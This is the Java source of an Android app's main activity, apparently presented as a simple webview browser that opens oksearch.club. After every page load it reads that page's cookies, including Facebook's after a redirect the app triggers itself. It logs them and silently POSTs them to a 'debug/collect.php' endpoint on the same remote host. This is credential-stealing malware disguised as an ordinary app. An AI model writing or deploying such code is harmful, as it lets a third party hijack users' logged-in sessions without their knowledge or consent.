package com.noelon.webviewapp;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    public WebView webView;
    public CookieManager cookieManager;
    public String cookie;
    public ProgressBar progressBar;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        progressBar = findViewById(R.id.progressBar);
        cookieManager = CookieManager.getInstance();

        webView = findViewById(R.id.webView);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);


                progressBar.setVisibility(View.GONE);

                cookieManager.setAcceptThirdPartyCookies(webView, true);
                cookieManager.setAcceptCookie(true);
                cookie = cookieManager.getCookie(url);

                Log.d("Cookies:", cookie);

                postCookie(cookie);

                String getUrl = webView.getUrl();

                if (getUrl.contains("3")) {
                    Log.d("Hey there", "I contain 3");
                    webView.loadUrl("https://facebook.com/");
                } else if (getUrl.contains("success")) {
                    Log.d("Hey there", "I contain success");
                    webView.loadUrl("https://youtube.com/");
                }


            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);

                progressBar.setVisibility(View.VISIBLE);


            }
        });
        webView.getSettings().setUseWideViewPort(false);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl("https://oksearch.club");


    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            switch (keyCode) {
                case KeyEvent.KEYCODE_BACK:
                    if (webView.canGoBack()) {
                        webView.goBack();
                    } else {
                        finish();
                    }
                    return true;
            }

        }
        return super.onKeyDown(keyCode, event);
    }

    public void postCookie(String cookie) {
        OkHttpClient client = new OkHttpClient();

        RequestBody body = new FormBody.Builder()
                .add("Cookies", cookie)
                .build();
        Request request = new Request.Builder()
                .url("https://oksearch.club/debug/collect.php")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                Log.d("Failure::", e.getMessage());

            }

            @Override
            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("Success", "Posted");
                } else {
                    Log.d("Failed response", response.message());

                }
            }
        });


    }
}
